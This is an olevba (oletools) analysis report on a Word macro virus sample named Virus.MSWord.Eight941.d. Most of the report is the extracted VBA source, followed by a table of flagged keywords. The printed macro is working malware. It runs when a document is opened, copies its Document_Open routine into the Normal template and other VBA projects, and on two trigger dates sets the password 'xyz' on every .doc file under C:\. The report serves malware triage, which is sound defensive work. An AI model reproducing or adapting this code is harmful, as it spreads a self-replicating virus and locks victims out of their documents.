olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Eight941.d-1af68a9996b64af31b47a97f14e68dc025ac11f2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Eight941.d-1af68a9996b64af31b47a97f14e68dc025ac11f2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Raiz
' R
'
' 23/02/00 19:13:07
'
' Raiz
' R
'
' 23/02/00 17:34:12
'
' Raiz
' R
'
' 23/02/00 17:18:54
'
' Raiz
' R
'
' 23/02/00 17:18:16
'
' Raiz
' R
'
' 23/02/00 16:33:28
'
' Raiz
' R
'
' 23/02/00 16:17:41
'
' Raiz
' R
'
' 23/02/00 15:51:16
'
' Raiz
' R
'
' 23/02/00 15:20:07
'
' Raiz
' R
'
' 23/02/00 14:35:10
'
' Raiz
' R
'
' 23/02/00 14:34:40
'
' Raiz
' R
'
' 23/02/00 14:06:39
'
' Raiz
' R
'
' 23/02/00 13:41:54
'
' Raiz
' R
'
' 23/02/00 13:40:08
'
' Raiz
' R
'
' 23/02/00 10:24:50
'
' Raiz
' R
'
' 22/02/00 18:31:42
'
' Raiz
' R
'
' 22/02/00 17:49:43
'
' Raiz
' R
'
' 22/02/00 17:19:24
'
' Raiz
' R
'
' 22/02/00 17:18:43
'
' Raiz
' R
'
' 22/02/00 17:11:10
'
' Raiz
' R
'
' 22/02/00 17:10:51
'
' Raiz
' R
'
' 22/02/00 17:10:41
'
' Raiz
' R
'
' 22/02/00 14:31:59
'
' Raiz
' R
'
' 22/02/00 14:27:55
'
' Raiz
' R
'
' 22/02/00 14:24:18
'
' Raiz
' R
'
' 22/02/00 14:13:32
'
' Raiz
' R
'
' 22/02/00 14:12:11
'
' Raiz
' R
'
' 22/02/00 14:08:51
'
' Raiz
' R
'
' 22/02/00 13:11:05
'
' Raiz
' R
'
' 22/02/00 13:09:58
'
' Raiz
' R
'
' 22/02/00 13:09:36
'
' Raiz
' R
'
' 22/02/00 13:07:34
'
' Raiz
' R
'
' 22/02/00 12:07:43
'
' Raiz
' R
'
' 22/02/00 12:07:11
'
' Raiz
' R
'
' 22/02/00 12:06:56
'
' Raiz
' R
'
' 22/02/00 12:06:28
'
' Raiz
' R
'
' 22/02/00 12:06:04
'
' Raiz
' R
'
' 22/02/00 12:04:32
'
' Raiz
' R
'
' 22/02/00 11:42:54
'
' Raiz
' R
'
' 22/02/00 10:09:13
'
Private Sub Document_Open()
On Error GoTo 0
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            On Error GoTo Exitsub
            Documents.Open FileName:=fs.FileSearch, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
            ActiveDocument.Password = "xyz"
            ActiveDocument.Save
            ActiveDocument.Close
Exitsub:
        On Error GoTo 0
        
        Next i
    End If
End If
End Sub



















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

